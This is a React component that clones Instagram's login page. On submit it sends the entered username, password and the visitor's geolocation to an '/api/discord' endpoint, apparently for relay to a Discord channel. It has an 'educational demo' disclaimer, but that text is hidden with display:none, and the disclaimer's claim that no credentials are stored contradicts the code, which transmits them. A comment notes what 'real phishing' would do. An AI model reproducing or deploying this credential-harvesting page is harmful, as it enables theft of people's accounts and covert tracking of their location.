'use client'

import { useState, FormEvent } from 'react'
import styles from './InstagramLogin.module.css'

interface InstagramLoginProps {
  location: { lat: number; lng: number } | null
}

export default function InstagramLogin({ location }: InstagramLoginProps) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [isPasswordFocused, setIsPasswordFocused] = useState(false)

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const response = await fetch('/api/discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'credentials',
          username: username,
          password: password,
          location: location,
          mapUrl: location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : null,
        }),
      })

      if (response.ok) {
        // Show success message (in real phishing, this would redirect)
        alert('Login successful! (This is a demo - no actual login occurred)')
        setUsername('')
        setPassword('')
      } else {
        alert('Login failed. Please try again.')
      }
    } catch (error) {
      console.error('Error submitting form:', error)
      alert('An error occurred. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className={styles.container}>
      {/* Language Selector */}
      <div className={styles.languageSelector}>
        <span>English (US)</span>
      </div>

      {/* Main Login Box */}
      <div className={styles.loginBox}>
        {/* Instagram Icon Logo */}
        <div className={styles.logo}>
          <div className={styles.instagramIcon}>
            <img 
              src="/img/Instagram_mobile.png" 
              alt="Instagram" 
              className={styles.instagramIconImage}
            />
          </div>
        </div>

        {/* Login Form */}
        <form className={styles.form} onSubmit={handleSubmit}>
          <div className={styles.inputGroup}>
            <input
              type="text"
              placeholder="Username, email or mobile number"
              className={styles.input}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
            />
          </div>

          <div className={styles.inputGroup}>
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              className={styles.input}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setIsPasswordFocused(true)}
              onBlur={() => setIsPasswordFocused(false)}
              required
            />
            {isPasswordFocused && (
              <button
                type="button"
                className={styles.showPasswordBtn}
                onClick={() => setShowPassword(!showPassword)}
              >
                <img 
                  src="/img/hide.png" 
                  alt={showPassword ? 'Hide password' : 'Show password'}
                  className={styles.passwordIcon}
                />
              </button>
            )}
          </div>

          <button
            type="submit"
            className={`${styles.loginButton} ${isLoading ? styles.loading : ''}`}
            disabled={isLoading}
          >
            {isLoading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Forgot Password Link */}
        <div className={styles.forgotPassword}>
          <a href="#">Forgot password?</a>
        </div>
      </div>

      {/* Create New Account Button */}
      <div className={styles.createAccountBox}>
        <button className={styles.createAccountButton}>
          Create new account
        </button>
      </div>

      {/* Meta Logo */}
      <div className={styles.metaLogo}>
        <img 
          src="/img/meta-icon.svg" 
          alt="Meta" 
          className={styles.metaIcon}
        />
        <span className={styles.metaText}>Meta</span>
      </div>

      {/* Location Indicator (hidden on mobile, shown for demo) */}
      {location && (
        <div className={styles.locationIndicator} style={{ display: 'none' }}>
          📍 Location accessed: {location.lat.toFixed(4)}, {location.lng.toFixed(4)}
        </div>
      )}

      {/* Disclaimer (hidden on mobile, shown for demo) */}
      <div className={styles.disclaimer} style={{ display: 'none' }}>
        <p>⚠️ <strong>EDUCATIONAL DEMO ONLY</strong> - This is a cybersecurity awareness demonstration. No real credentials are stored.</p>
      </div>
    </div>
  )
}
